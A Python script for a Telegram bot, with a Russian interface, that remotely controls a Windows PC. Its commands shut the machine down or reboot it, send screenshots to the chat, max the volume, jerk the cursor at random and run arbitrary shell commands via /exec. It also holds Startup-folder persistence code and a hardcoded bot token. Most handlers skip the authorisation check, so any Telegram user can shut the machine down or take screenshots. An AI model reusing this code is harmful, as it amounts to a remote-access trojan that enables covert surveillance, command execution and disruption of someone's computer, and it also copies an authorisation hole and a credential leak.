import os
import ctypes
import subprocess
import time
import pyautogui
import psutil
import requests
import random
import threading
import sys
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton


TOKEN = '7705187388:AAHpk8mse7bpSDs29_G1YG36K-a_loHCyo4'
bot = telebot.TeleBot(TOKEN)


AUTHORIZED_USERS = [7112508548]


cursor_moving = False
cursor_thread = None



def shutdown():
    os.system('shutdown /s /t 1')


def reboot():
    os.system('shutdown /r /t 1')


def sleep():
    os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')


def wake_up():
    ctypes.windll.user32.SetThreadExecutionState(0x80000002)


def logout():
    os.system('shutdown /l')


def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')


def open_cmd():
    os.system('start cmd')


def minimize_all_windows():
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x4D, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
    ctypes.windll.user32.keybd_event(0x4D, 0, 2, 0)


def get_system_info():
    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().percent
    uptime_seconds = int(psutil.boot_time())
    uptime = str(psutil.boot_time())

    uptime = int(time.time() - uptime_seconds)
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_formatted = f"{hours} ч {minutes} мин {seconds} сек"
    return f"📊 <b>Информация о системе:</b>\n\n<b>CPU:</b> {cpu_usage}%\n<b>Память:</b> {memory_usage}%\n<b>Аптайм:</b> {uptime_formatted}"


def get_ip_address():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_address = response.json().get("ip")
        return f"🌐 <b>Текущий IP-адрес:</b> {ip_address}"
    except requests.RequestException:
        return "❌ Не удалось получить IP-адрес."


def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files) if files else "Папка пуста."
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def play_sound(file_path):
    if os.path.exists(file_path):
        os.system(f'start {file_path}')
    else:
        print(f"Файл {file_path} не найден.")


def set_max_volume():
    try:
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from comtypes import CLSCTX_ALL
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    except Exception as e:
        print(f"Ошибка при установке громкости: {e}")


def move_cursor_randomly():
    global cursor_moving
    while cursor_moving:
        x = random.randint(0, pyautogui.size().width)
        y = random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x, y, duration=0.5)
        time.sleep(1)


def execute_cmd(command):
    try:

        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result if result else "Команда выполнена успешно без вывода."
    except subprocess.CalledProcessError as e:
        return f"❌ Ошибка выполнения команды:\n{e.output}"


def add_to_startup():
    try:

        if getattr(sys, 'frozen', False):

            script_path = sys.executable
        else:
            script_path = os.path.abspath(__file__)


        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_dir, 'PC_Control_Bot.lnk')


        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()

        print("✅ Скрипт добавлен в автозагрузку.")
    except Exception as e:
        print(f"❌ Не удалось добавить скрипт в автозагрузку: {e}")



def ensure_startup():
    try:
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_dir, 'PC_Control_Bot.lnk')
        if not os.path.exists(shortcut_path):
            add_to_startup()
    except Exception as e:
        print(f"❌ Ошибка при проверке автозагрузки: {e}")



def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS



def main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = [
        KeyboardButton('/shutdown'),
        KeyboardButton('/reboot'),
        KeyboardButton('/sleep'),
        KeyboardButton('/wakeup'),
        KeyboardButton('/logout'),
        KeyboardButton('/screenshot'),
        KeyboardButton('/cmd'),
        KeyboardButton('/minimize'),
        KeyboardButton('/system_info'),
        KeyboardButton('/ip_address'),
        KeyboardButton('/list_files'),
        KeyboardButton('/play_sound'),
        KeyboardButton('/move_cursor'),
        KeyboardButton('/stop_cursor'),
        KeyboardButton('/max_volume'),
        KeyboardButton('/exec'),
    ]
    keyboard.add(*buttons)
    return keyboard



@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message,"❌ У вас нет доступа к этому боту.")
        return

    welcome_text = (
        "👋 Привет! Я бот для управления ПК. Вот что я умею:\n\n"
        "🔧 **Команды:**\n"
        "/shutdown - Выключить ПК\n"
        "/reboot - Перезагрузить ПК\n"
        "/sleep - Перевести ПК в режим сна\n"
        "/wakeup - Вывести ПК из режима сна\n"
        "/logout - Выйти из текущей сессии\n"
        "/screenshot - Сделать скриншот\n"
        "/cmd - Запустить командную строку\n"
        "/minimize - Свернуть все окна\n"
        "/system_info - Получить информацию о системе\n"
        "/ip_address - Получить текущий IP-адрес\n"
        "/list_files - Список файлов в директории\n"
        "/play_sound - Проиграть звуковой файл\n"
        "/move_cursor - Начать рандомное перемещение курсора\n"
        "/stop_cursor - Остановить рандомное перемещение курсора\n"
        "/max_volume - Установить громкость на максимум\n"
        "/exec - Выполнить произвольную команду в cmd\n"
    )
    bot.reply_to(message,welcome_text, reply_markup=main_menu())



@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    shutdown()
    bot.send_message(message.chat.id, "🛑 ПК будет выключен.")

@bot.message_handler(commands=['reboot'])
def handle_reboot(message):
    reboot()
    bot.send_message(message.chat.id, "🔄 ПК будет перезагружен.")

@bot.message_handler(commands=['sleep'])
def handle_sleep(message):
    sleep()
    bot.send_message(message.chat.id, "💤 ПК переведен в режим сна.")

@bot.message_handler(commands=['wakeup'])
def handle_wakeup(message):
    wake_up()
    bot.send_message(message.chat.id, "🔋 ПК выведен из режима сна.")

@bot.message_handler(commands=['logout'])
def handle_logout(message):
    logout()
    bot.send_message(message.chat.id, "🚪 Выход из текущей сессии инициирован.")

@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    try:
        take_screenshot()
        with open('screenshot.png', 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="📸 Скриншот экрана.")
        os.remove('screenshot.png')
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка при создании скриншота: {e}")

@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    open_cmd()
    bot.send_message(message.chat.id, "💻 Командная строка запущена.")

@bot.message_handler(commands=['minimize'])
def handle_minimize(message):
    minimize_all_windows()
    bot.send_message(message.chat.id, "📉 Все окна свернуты.")

@bot.message_handler(commands=['system_info'])
def handle_system_info(message):
    info = get_system_info()
    bot.send_message(message.chat.id, info, parse_mode='HTML')

@bot.message_handler(commands=['ip_address'])
def handle_ip_address(message):
    ip_address = get_ip_address()
    bot.send_message(message.chat.id, ip_address, parse_mode='HTML')

@bot.message_handler(commands=['list_files'])
def handle_list_files(message):
    directory = '.'
    files = list_files(directory)
    bot.send_message(message.chat.id, f"📁 <b>Список файлов в директории {directory}:</b>\n{files}", parse_mode='HTML')

@bot.message_handler(commands=['play_sound'])
def handle_play_sound(message):
    file_path = 'file.wav'
    if os.path.exists(file_path):
        play_sound(file_path)
        bot.send_message(message.chat.id, "🔊 Звуковой файл воспроизведен.")
    else:
        bot.send_message(message.chat.id, "❌ Файл звука не найден.")

@bot.message_handler(commands=['move_cursor'])
def handle_move_cursor(message):
    global cursor_moving, cursor_thread
    if cursor_moving:
        bot.send_message(message.chat.id, "⚠️ Курсор уже перемещается.")
        return
    cursor_moving = True
    cursor_thread = threading.Thread(target=move_cursor_randomly, daemon=True)
    cursor_thread.start()
    bot.send_message(message.chat.id, "🎮 Начато рандомное перемещение курсора.")

@bot.message_handler(commands=['stop_cursor'])
def handle_stop_cursor(message):
    global cursor_moving
    if not cursor_moving:
        bot.send_message(message.chat.id, "⚠️ Курсор не перемещается.")
        return
    cursor_moving = False
    bot.send_message(message.chat.id, "🛑 Рандомное перемещение курсора остановлено.")

@bot.message_handler(commands=['max_volume'])
def handle_max_volume(message):
    try:
        set_max_volume()
        bot.send_message(message.chat.id, "🔊 Громкость установлена на максимум.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Не удалось установить громкость: {e}")

@bot.message_handler(commands=['exec'])
def handle_exec(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ У вас нет доступа к этой команде.")
        return
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.send_message(message.chat.id, "❌ Пожалуйста, укажите команду для выполнения.\nПример: /exec dir")
        return
    command = command[1]
    output = execute_cmd(command)
    if len(output) > 4000:
        output = output[:4000] + "\n... (Обрезано)"
    bot.send_message(message.chat.id, f"💻 <b>Результат выполнения команды:</b>\n{output}", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text not in ['/start', '/shutdown', '/reboot', '/sleep',
                                                               '/wakeup', '/logout', '/screenshot', '/cmd',
                                                               '/minimize', '/system_info', '/ip_address',
                                                               '/list_files', '/play_sound', '/move_cursor',
                                                               '/stop_cursor', '/max_volume', '/exec'])
def handle_unknown(message):
    bot.send_message(message.chat.id, "❓ Неизвестная команда. Пожалуйста, используйте кнопки или введите /start для начала.")

def run_bot():
    print('Запущен\n')
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)  # Увеличение таймаута
        except Exception as e:
            print(e)
            time.sleep(15)  # Задержка перед повторной попыткой
if __name__ == "__main__":
    run_bot()
